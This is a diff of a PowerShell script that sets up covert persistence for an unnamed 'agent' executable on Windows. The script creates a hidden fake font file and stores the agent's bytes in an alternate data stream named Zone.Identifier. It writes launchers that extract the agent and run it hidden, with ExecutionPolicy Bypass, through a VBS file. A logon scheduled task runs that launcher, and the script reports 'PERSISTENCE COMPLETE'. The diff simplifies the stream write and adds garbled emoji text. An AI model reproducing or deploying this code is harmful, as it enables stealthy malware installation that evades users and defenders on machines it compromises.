@@ -4,12 +4,11 @@ $WarningPreference = 'SilentlyContinue'
 $VerbosePreference = 'SilentlyContinue'
 $DebugPreference = 'SilentlyContinue'
 $InformationPreference = 'SilentlyContinue'
-
 param($args)
 
 $agentPath = $env:AgentPath
 if (-not $agentPath) {
-    Write-Output "❌ AgentPath environment variable not set."
+    Write-Output "âŒ AgentPath environment variable not set."
     exit
 }
 
@@ -22,49 +21,21 @@ if (-not (Test-Path $fontDir)) {
 }
 
 $fontFile = "$fontDir\seguibl.ttf"
-
-# Clean slate for the font file
-if (Test-Path $fontFile) {
-    Remove-Item $fontFile -Force -ErrorAction SilentlyContinue
-    Write-Output "[+] Removed existing font file"
-}
-
-# Create fresh empty file
-New-Item -ItemType File -Path $fontFile -Force | Out-Null
-attrib +h $fontFile
-Write-Output "[+] Created fresh font file: $fontFile"
-
-# --- 2. Write agent to ADS (bulletproof) ---
-$streamName = "Zone.Identifier"
-
-# Ensure file is not read-only
-Set-ItemProperty -Path $fontFile -Name IsReadOnly -Value $false -Force -ErrorAction SilentlyContinue
-
-Write-Output "[*] Writing agent to ADS using Set-Content -Stream..."
-$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
-Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte -Force
-
-# Give the file system a moment to register the stream
-Start-Sleep -Milliseconds 500
-
-# Verify the stream exists
-$streams = Get-Item $fontFile -Stream * -ErrorAction SilentlyContinue
-if ($streams.Name -contains $streamName) {
-    $size = (Get-Item $fontFile -Stream $streamName).Length
-    Write-Output "[+] Verified: ADS '$streamName' exists (size: $size bytes)."
-    # Double-check by reading back a few bytes
-    $testRead = Get-Content -Path $fontFile -Stream $streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
-    if ($testRead) {
-        Write-Output "[+] Read test successful."
-    } else {
-        Write-Output "[-] Read test failed. Stream may be corrupted."
-        exit
-    }
+if (-not (Test-Path $fontFile)) {
+    $fakeFontContent = "TTF fake font file - do not delete"
+    Set-Content -Path $fontFile -Value $fakeFontContent -Encoding ASCII -Force
+    attrib +h $fontFile
+    Write-Output "[+] Created fake font file: $fontFile"
 } else {
-    Write-Output "[-] ADS not found after write. Persistence will fail."
-    Write-Output "    Check: Drive must be NTFS, file not locked, antivirus not blocking."
-    exit
+    Write-Output "[+] Using existing font file: $fontFile"
 }
+
+# --- 2. Hide agent in ADS ---
+$streamName = "Zone.Identifier"
+Write-Output "[+] Hiding agent in ADS: $fontFile`:$streamName"
+$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
+Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
+$hiddenPath = "$fontFile`:$streamName"
 
 # --- 3. Create launcher script (run.ps1) with cleanup ---
 $launcherPath = "$fontDir\run.ps1"
@@ -79,10 +50,6 @@ if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction Silentl
 
 # Extract agent from ADS
 `$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
-if (-not `$bytes) {
-    # Fallback: use .NET method (more reliable)
-    try { `$bytes = [System.IO.File]::ReadAllBytes("`$fontFile`:`$streamName") } catch {}
-}
 if (`$bytes) {
     [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
     Start-Process -WindowStyle Hidden `$tempAgent
@@ -94,6 +61,7 @@ Write-Output "[+] Created launcher with cleanup: $launcherPath"
 
 # --- 4. Create VBS launcher (completely invisible) ---
 $vbsPath = "$fontDir\run.vbs"
+# Correct VBS syntax: double quotes inside the string are escaped by doubling them.
 $vbsContent = @"
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$launcherPath""", 0, False
@@ -147,12 +115,12 @@ if (-not $taskCreated) {
 }
 
 if (-not $taskCreated) {
-    Write-Output "❌ Failed to create scheduled task."
+    Write-Output "âŒ Failed to create scheduled task."
 } else {
     Write-Output ""
-    Write-Output "✅ PERSISTENCE COMPLETE"
+    Write-Output "âœ… PERSISTENCE COMPLETE"
     Write-Output "Script location: $launcherPath"
     Write-Output "VBS launcher: $vbsPath"
-    Write-Output "Agent hidden in: $fontFile`:$streamName"
+    Write-Output "Agent hidden in: $hiddenPath"
     Write-Output "The scheduled task will run the VBS (invisible) on next logon."
 }
